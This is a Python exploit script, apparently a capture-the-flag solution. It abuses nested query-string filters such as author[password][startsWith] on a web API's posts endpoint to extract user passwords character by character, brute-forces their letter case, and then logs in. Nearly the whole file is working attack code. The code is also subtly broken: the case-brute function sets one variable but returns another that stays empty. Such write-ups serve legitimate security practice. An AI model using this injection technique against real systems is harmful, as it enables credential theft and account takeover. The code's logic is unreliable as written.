import requests
import itertools

url="http://localhost:3000"
# url="http://35.239.207.1:3000/"

def login(password):
	data = {
		"name": "White",
		"password": password
	}
	resp = requests.post(url+"/api/login", json=data)
	print(resp.text)
	if "uoftctf" in resp.text:
		return True
	return False	

def post_query(payload):
	return requests.get(url+"/api/posts?"+payload).json()

def brute_pass(user):
	chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	password = ""
	correct_password = ""
	while not correct_password:
		for c in chars: 
			new_password = password + c
			payload=f'author[name]={user}&author[password][startsWith]={new_password}'
			print(f"Attempt: {new_password}")
			resp = post_query(payload)
			if len(resp['posts']):
				password = new_password
				print(f"Password: {password}")
				if (len(password) >= 15):
					print("Trying Login...")
					payload=f'author[name]={user}&author[password][endsWith]={password}'
					resp = post_query(payload)
					if len(resp['posts']):
						correct_password = brute_case(password)
				break
			else:
				print("incorrect")
	return correct_password

def brute_case(password):
	case_permutations = set()
	for combo in itertools.product(*[(char.lower(), char.upper()) for char in password]):
		case_permutations.add(''.join(combo))
	case_permutations_list = sorted(list(case_permutations))
	
	correct_password = ""
	for case in case_permutations_list:
		payload=f'author[name]={user}&author[password]={case}'
		print(f"Bruteforcing case {case} {len(case_permutations_list)}")		
		resp = post_query(payload)
		if len(resp['posts']):
			correct_pass = case
			break
	return correct_password
	
users = ["White", "Bob", "Tommy", "Sam"] 
for user in users:
	password = brute_pass(user)
	print(f"User: {user} Password: {password}")
	flag = login(password)
	if flag:
		break

# login("jrcdQwlSli36nd2lZUiN")/
# post_query(f'author[name]=White&[published]=false')
